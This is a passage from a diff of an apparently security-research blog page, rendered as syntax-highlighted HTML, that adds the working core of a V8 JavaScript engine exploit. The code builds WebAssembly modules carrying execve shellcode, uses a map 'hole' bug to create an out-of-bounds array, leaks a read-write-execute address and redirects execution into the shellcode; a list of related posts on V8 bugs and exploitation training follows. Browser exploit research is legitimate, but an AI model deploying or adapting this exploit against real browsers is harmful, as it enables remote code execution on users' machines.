class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xd2</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f1</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// to corrupt the pointer here.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">wasm_code_helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_mod_helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code_helper</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance_helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod_helper</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f2</span> <span class="o">=</span> <span class="nx">wasm_instance_helper</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Actual Exploit Starting
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">exp</span><span class="p">(){</span>    
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">hole</span> <span class="o">=</span> <span class="nx">Set</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">hole</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">set</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Set</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x1000000000050001</span><span class="nx">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">obj_list</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">bob</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.2</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">,</span> <span class="mf">0.4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="o">-</span><span class="nx">map</span><span class="p">.</span><span class="nx">size</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">a</span><span class="p">[</span><span class="o">-</span><span class="nx">map</span><span class="p">.</span><span class="nx">size</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">ret</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">OOB</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">OOB</span> <span class="o">=</span> <span class="nx">bob</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">OOB</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">gc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">OOB</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">2</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;OOB Array Creation - Failed.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;Gained OOB Array. Array Length: &#34;</span> <span class="o">+</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">OOB</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// The stack is misaligned here. pain!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">OOB</span><span class="p">[</span><span class="mh">0x3645e</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">rwx</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">OOB</span><span class="p">[</span><span class="mh">0x3645f</span><span class="p">])</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;RWX Address: &#34;</span> <span class="o">+</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">rwx</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// trigger the first wasm function.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">f1</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">func_rwx_offset</span> <span class="o">=</span> <span class="nx">rwx</span> <span class="o">+</span> <span class="mh">0x81a</span><span class="nx">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">OOB</span><span class="p">[</span><span class="mh">0x36478</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">func_rwx_offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">f2</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">exp</span><span class="p">();</span>
+</span></span></code></pre></div>
           
           
           
@@ -933,6 +1269,448 @@
 
         
 
+
+<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/posts/1728449827421-expm1-35c3---bug/-optimizations-analysis/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1728449827421-expm1-35c3---bug/-optimizations-analysis/featured_hu_6344bd60a049573d.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/1728449827421-expm1-35c3---bug/-optimizations-analysis/">expm1-35C3 - Bug/ Optimizations Analysis</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-02-19T00:00:00&#43;00:00">2024-02-19</time><span class="px-2 text-primary-500">&middot;</span><span>1734 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/math.expm1/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Math.expm1
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/typer/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Typer
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/oob/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    OOB
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          In this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the optimization process.
+
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/posts/1728446785503-cve-2024-0517-quick-blog/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/1728446785503-cve-2024-0517-quick-blog/featured_hu_34a48e152b76add2.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/1728446785503-cve-2024-0517-quick-blog/">CVE-2024-0517 Quick Blog</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-05-03T00:00:00&#43;00:00">2024-05-03</time><span class="px-2 text-primary-500">&middot;</span><span>1337 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/browser/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Browser
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/v8/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    V8
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/maglev/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Maglev
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          This post explores a vulnerability found in the Maglev optimizing compiler of V8, specifically within a function responsible for optimizing classes that inherit from a parent class.
+
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/training/1728229152748-format-string-exploitation-train-2/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/training/1728229152748-format-string-exploitation-train-2/featured_hu_4792feac4f6c9516.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/training/1728229152748-format-string-exploitation-train-2/">Format String Exploitation [train 2]</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <span>1580 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/pwn/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pwn
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/training/&#34;,'_self');return false;">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Training
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          This is the 2nd challenge in the in the series. In this training we will go through the format string exploitation technique. We are provided 2 challenges of the same vulnerability. Lets go through them one by one.
+
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+</section>
 
   
       </div>
